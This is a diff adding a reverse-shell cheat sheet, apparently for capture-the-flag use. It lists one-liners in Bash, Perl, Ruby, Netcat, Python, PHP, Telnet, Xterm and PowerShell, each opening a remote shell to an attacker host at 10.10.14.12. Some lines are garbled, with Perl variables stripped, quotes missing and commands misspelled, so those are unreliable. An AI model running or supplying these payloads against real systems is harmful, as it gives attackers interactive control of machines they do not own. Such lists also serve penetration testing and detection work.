@@ -1,0 +1,56 @@
+BASH
+bash -i >& /dev/tcp/10.10.14.12/5555 0>&1
+0<&196;exec 196<>/dev/tcp/10.10.14.12/5555; sh <&196 >&196 2>&196
+
+also you can do this first
+exec 5<>/dev/tcp/10.10.14.12/5555
+and then this
+cat <&5 | while read line; do $line 2>&5 >&5; done									
+or this								
+while read line 0<&5; do $line 2>&5 >&5; done
+
+PERL
+
+(Linux)
+perl -e 'use Socket;$i="10.10.14.12";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '=fork;exit,if();=new IO::Socket::INET(PeerAddr,10.10.14.12:5555);STDIN->fdopen(,r);$~->fdopen(,w);systemPERL REVERSE SHELL while<>;'
+(Windows)
+perl -MIO -e '=new IO::Socket::INET(PeerAddr,10.10.14.12:5555);STDIN->fdopen(,r);$~->fdopen(,w);systemPERL REVERSE SHELL WINDOWS while<>;'
+
+RUBY 
+
+(Linux)
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(10.10.14.12,5555);while(cmd=c.gets);IO.popen(cmd,r){|io|c.print io.read}end'
+ruby -rsocket -ef=TCPSocket.open("10.10.14.12",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+ruby -rsocket -e'f=TCPSocket.open("10.10.14.12",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+(Windows)
+ruby -rsocket -e 'c=TCPSocket.new(10.10.14.12,5555);while(cmd=c.gets);IO.popen(cmd,r){|io|c.print io.read}end'
+
+NETCAT 
+
+(Linux)
+nc -c /bin/sh 10.10.14.12 5555
+/bin/sh | nc 10.10.14.12 5555
+rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.12 5555 0/tmp/p
+(Windows)
+nc.exe 10.10.14.12 5555 -e cmd.exe
+
+PYTHON 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.10.14.12,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
+or (Try the second one first)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.12',5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'
+PHP 
+php -r $sock=fsockopen("10.10.14.12",5555);exec("/bin/sh -i <&3 >&3 2>&3");
+php -r '$sock=fsockopen("10.10.14.12",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/5555 0>&1'");?>
+<?php system (“makefifo /tmp/f/;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 5555>/tmp/f"); ?>
+
+TELNET
+rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.12 5555 0/tmp/p
+telnet 10.10.14.12 4444 | /bin/bash | telnet 10.10.14.12 4445   # Remember to listen both on 4444 and 4445
+
+XTERM
+xterm -display 10.10.14.12:5555
+
+POWERSHELL
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.12",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
